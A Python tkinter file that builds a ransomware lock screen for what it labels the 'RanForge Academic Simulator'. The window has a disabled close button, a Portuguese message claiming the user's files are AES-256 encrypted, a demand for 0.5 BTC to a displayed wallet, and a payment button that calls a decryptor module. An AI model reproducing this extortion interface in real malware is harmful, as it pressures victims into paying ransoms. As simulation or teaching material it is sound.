import tkinter as tk
from tkinter import messagebox
import decryptor
import threading

class RansomwareGUI:
    def __init__(self, duration_seconds):
        self.root = tk.Tk()
        self.root.title("RANFORGE LOCKER")
        self.root.geometry("800x600")
        self.root.configure(bg="#8B0000") 
        self.duration = duration_seconds

        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)

        self._build_ui()

    def disable_event(self):
        pass 

    def _build_ui(self):
        main_frame = tk.Frame(self.root, bg="black", bd=10, relief="ridge")
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        lbl_title = tk.Label(main_frame, text="SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!", 
                             font=("Courier New", 24, "bold"), fg="red", bg="black")
        lbl_title.pack(pady=20)

        msg = (f"O ataque foi concluído em {self.duration:.2f} segundos.\n\n"
               "Seus documentos, fotos e bancos de dados estão inacessíveis.\n"
               "Criptografia utilizada: AES-256 (Nível Militar).\n"
               "Para recuperar, envie 0.5 BTC para o endereço abaixo.")
        
        lbl_msg = tk.Label(main_frame, text=msg, font=("Arial", 12), fg="white", bg="black", justify="center")
        lbl_msg.pack(pady=20)

        lbl_wallet = tk.Label(main_frame, text="Carteira BTC:", fg="yellow", bg="black", font=("Arial", 10))
        lbl_wallet.pack()
        
        entry_wallet = tk.Entry(main_frame, width=40, font=("Courier", 12), justify="center")
        entry_wallet.insert(0, "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")
        entry_wallet.config(state="readonly")
        entry_wallet.pack(pady=5)

        btn_pay = tk.Button(main_frame, text="CONFIRMAR PAGAMENTO E DESCRIPTOGRAFAR", 
                            bg="red", fg="white", font=("Arial", 14, "bold"),
                            command=self.on_pay_click)
        btn_pay.pack(pady=40, ipady=10, ipadx=10)

        lbl_footer = tk.Label(main_frame, text="RanForge Academic Simulator - DO NOT PAY REAL MONEY", 
                              fg="gray", bg="black", font=("Arial", 8))
        lbl_footer.pack(side="bottom", pady=10)

    def on_pay_click(self):
        messagebox.showinfo("Aguarde", "Conectando ao Blockchain para verificar transação...")
        
        report = decryptor.run_decryption_logic()
        
        messagebox.showinfo("SUCESSO", "Pagamento confirmado!\nIniciando recuperação...\n\n" + report)
        self.root.destroy() 

    def run(self):
        self.root.mainloop()

def show_screen(duration):
    app = RansomwareGUI(duration)
    app.run()